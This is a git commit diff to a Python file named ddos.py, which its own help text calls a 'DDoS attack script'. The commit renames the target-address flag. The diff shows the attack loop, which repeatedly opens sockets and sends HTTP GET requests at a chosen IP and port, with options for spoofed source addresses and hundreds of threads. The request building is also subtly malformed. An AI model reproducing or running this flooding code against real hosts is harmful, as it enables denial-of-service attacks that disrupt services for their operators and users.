24650a252c8271b2ed7991ab30b9a1e79ca347e2
N00ber17 <azernaceur17@gmail.com>
2024-05-30 17:17:01 +0100

    Fixed conflicting flags

--- ddos.py
+++ ddos.py
@@ -15,7 +15,7 @@ def ip_address(ip):
 
 # Parsing the flags
 parser = argparse.ArgumentParser(description='DDoS attack script using simulated multithreading.')
-parser.add_argument('-t', '--target', type=ip_address, required=True, help="Target IP address.")
+parser.add_argument('-d', '--destination', type=ip_address, required=True, help="Target IP address.")
 parser.add_argument('-p', '--port', type=int, default=80, help="The port the script will attack (only 80 is supported for now)")
 parser.add_argument('-s', '--spoof', action='store_true', help='Use a spoofed random IP address.')
 parser.add_argument('-t', '--threads', type=int, default=500,  help='Specify the numbers of threads to be running.')
@@ -34,9 +34,9 @@ else:
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((args.target, args.port))
-        s.sendto(("GET" + args.target + " HTTP/1.1\r\n").encode('ascii'), (args.target, args.port))
-        s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (args.target, args.port))
+        s.connect((args.destination, args.port))
+        s.sendto(("GET" + args.destination + " HTTP/1.1\r\n").encode('ascii'), (args.destination, args.port))
+        s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (args.destination, args.port))
         s.close()
         print("[+] Connected\t")
 
